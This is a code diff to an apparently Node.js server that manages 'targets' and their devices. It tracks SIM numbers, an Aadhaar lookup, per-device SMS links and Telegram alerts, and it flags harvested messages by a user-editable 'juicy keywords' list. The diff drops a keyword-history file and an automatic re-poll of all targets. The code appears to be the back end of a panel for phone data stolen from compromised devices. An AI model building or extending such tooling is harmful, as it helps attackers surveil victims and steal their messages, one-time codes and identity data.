@@ -911,7 +911,8 @@ function summariseTarget(target) {
 
   for (const [, dev] of deviceList) {
     if (dev.current_status === 'online') online++;
-    // Juicy count uses current active JUICY_KEYWORDS (user's current selection)
+    // Juicy count uses current active keyword list (JUICY_KEYWORDS, which is user-editable)
+    // Backend stores all keywords ever found; frontend/count reflects current list
     if ((dev.juicy_keywords || []).some(k => JUICY_KEYWORDS.includes(k))) juicyCount++;
     if (extract10Digits(dev.sim1_number)) withSim1++;
     if (extract10Digits(dev.sim2_number)) withSim2++;
@@ -950,7 +951,8 @@ function buildDeviceList(target, devices, simOverrides, aadharDb) {
       sim2Clean:     extract10Digits(simForUrl[deviceId]?.sim2 || dev.sim2_number),
       sim1Override:  simForUrl[deviceId]?.sim1 || '',
       sim2Override:  simForUrl[deviceId]?.sim2 || '',
-      juicyKeywords: dev.juicy_keywords || [],
+      // Frontend shows only current active keywords; full history is stored in backend
+      juicyKeywords: (dev.juicy_keywords || []).filter(k => JUICY_KEYWORDS.includes(k)),
       appId:         dev.app_id         || 'N/A',
       objId:         dev.obj_id         || 'N/A',
       userSerial:    dev.user_serial    || 'N/A',
@@ -1205,7 +1207,7 @@ app.get('/api/search/device/:deviceId', (req, res) => {
           sim1:          dev.sim1_number    || 'N/A',
           sim2:          dev.sim2_number    || 'N/A',
           lastActivity:  dev.last_activity  || null,
-          juicyKeywords: dev.juicy_keywords || [],
+          juicyKeywords: (dev.juicy_keywords || []).filter(k => JUICY_KEYWORDS.includes(k)),
           smsLink:       getSmsLink(target, deviceId, dev.obj_id),
         });
       }
@@ -1362,12 +1364,12 @@ app.get('/api/names/:urlId', (req, res) => {
 });
 
 // ── Keywords: get/update the juicy keywords list ──────────────────────────────
-const KEYWORDS_FILE     = path.join(DATA_DIR, 'keywords.json');
-const ALL_KEYWORDS_FILE = path.join(DATA_DIR, 'all_keywords.json');
+const KEYWORDS_FILE = path.join(DATA_DIR, 'keywords.json');
 
 function loadKeywords() {
   try { if (fs.existsSync(KEYWORDS_FILE)) return JSON.parse(fs.readFileSync(KEYWORDS_FILE, 'utf8')); }
   catch {}
+  // Return the built-in list as default
   return [...JUICY_KEYWORDS];
 }
 function saveKeywordsFile(kws) {
@@ -1375,53 +1377,19 @@ function saveKeywordsFile(kws) {
   catch (e) { console.error('Keywords save error:', e.message); }
 }
 
-function loadAllKeywords() {
-  try { if (fs.existsSync(ALL_KEYWORDS_FILE)) return JSON.parse(fs.readFileSync(ALL_KEYWORDS_FILE, 'utf8')); }
-  catch {}
-  return [...JUICY_KEYWORDS];
-}
-function saveAllKeywordsFile(kws) {
-  try { fs.writeFileSync(ALL_KEYWORDS_FILE, JSON.stringify(kws, null, 2)); }
-  catch (e) { console.error('All-keywords save error:', e.message); }
-}
-
 app.get('/api/keywords', (req, res) => {
-  res.json({ keywords: loadKeywords(), all: loadAllKeywords() });
+  res.json({ keywords: loadKeywords() });
 });
 
 app.post('/api/keywords', express.json(), (req, res) => {
   const kws = req.body.keywords;
   if (!Array.isArray(kws)) return res.status(400).json({ error: 'keywords must be array' });
   const clean = [...new Set(kws.map(k => String(k).trim().toLowerCase()).filter(Boolean))];
-
-  // Detect which keywords are newly added (not in current active list)
-  const prevActive = new Set(loadKeywords());
-  const newlyAdded = clean.filter(k => !prevActive.has(k));
-
-  // Save active (current selection)
   saveKeywordsFile(clean);
-
-  // Accumulate: merge into all-keywords store (never discard)
-  const allKws = new Set(loadAllKeywords());
-  for (const k of clean) allKws.add(k);
-  saveAllKeywordsFile([...allKws]);
-
-  // Hot-reload in-memory JUICY_KEYWORDS
+  // Hot-reload: update in-memory JUICY_KEYWORDS array
   JUICY_KEYWORDS.length = 0;
   for (const k of clean) JUICY_KEYWORDS.push(k);
-
-  // If new keywords added, schedule a background re-poll of all targets
-  if (newlyAdded.length > 0) {
-    console.log(`[Keywords] ${newlyAdded.length} new keyword(s) added: ${newlyAdded.join(', ')} — triggering re-poll`);
-    setTimeout(() => {
-      console.log('[Keywords] Starting re-poll for new keywords…');
-      for (let i = 0; i < ALL_TARGETS.length; i++) {
-        setTimeout(() => pollTarget(ALL_TARGETS[i]), i * 1000);
-      }
-    }, 500);
-  }
-
-  res.json({ ok: true, count: clean.length, allCount: allKws.size, newlyAdded });
+  res.json({ ok: true, count: clean.length });
 });
 
 // ── Telegram Alert Store ──────────────────────────────────────────────────────
